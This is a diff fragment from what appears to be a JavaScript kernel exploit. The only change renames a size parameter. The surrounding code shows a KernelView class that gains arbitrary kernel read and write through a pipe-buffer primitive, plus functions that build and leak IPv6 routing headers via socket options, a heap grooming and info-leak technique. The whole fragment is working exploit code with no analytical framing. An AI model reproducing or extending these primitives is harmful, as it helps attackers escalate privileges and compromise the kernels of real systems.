@@ -144,12 +144,12 @@ class KernelView extends DataView {
     }
   }
 
-  kread(dst, src, sz) {
+  kread(dst, src, size) {
     this.pipe_backing = src;
-    this.pipe_count = sz;
+    this.pipe_count = size;
     this.flush();
 
-    const n = fn.read.invoke(this.slave_pipe[0], dst, sz);
+    const n = fn.read.invoke(this.slave_pipe[0], dst, size);
     if (n === -1n) {
       throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
     }
@@ -157,12 +157,12 @@ class KernelView extends DataView {
     return n;
   }
 
-  kwrite(dst, src, sz) {
+  kwrite(dst, src, size) {
     this.pipe_backing = dst;
-    this.pipe_count = sz;
+    this.pipe_count = size;
     this.flush();
 
-    const n = fn.write.invoke(this.slave_pipe[1], src, sz);
+    const n = fn.write.invoke(this.slave_pipe[1], src, size);
     if (n === -1n) {
       throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
     }
@@ -313,10 +313,10 @@ class KernelView extends DataView {
 }
 //#endregion
 //#region Functions
-function build_rthdr(addr, sz) {
+function build_rthdr(addr, size) {
   const rthdr0 = ip6_rthdr0.new(addr);
 
-  const in6_count = Math.floor((sz - ip6_rthdr0.sizeof) / in6_addr.sizeof);
+  const in6_count = Math.floor((size - ip6_rthdr0.sizeof) / in6_addr.sizeof);
 
   rthdr0.ip6r0_nxt = 0;
   rthdr0.ip6r0_len = in6_count * 2;
@@ -326,9 +326,9 @@ function build_rthdr(addr, sz) {
   return ip6_rthdr0.sizeof + in6_addr.sizeof * in6_count;
 }
 
-function get_rthdr(sock, sz) {
+function get_rthdr(sock, size) {
   const leak_rthdr0_len_addr = mem.alloc(4);
-  arw.view(leak_rthdr0_len_addr).setInt32(0, sz, true);
+  arw.view(leak_rthdr0_len_addr).setInt32(0, size, true);
   if (fn.getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr) === -1) {
     throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
   }
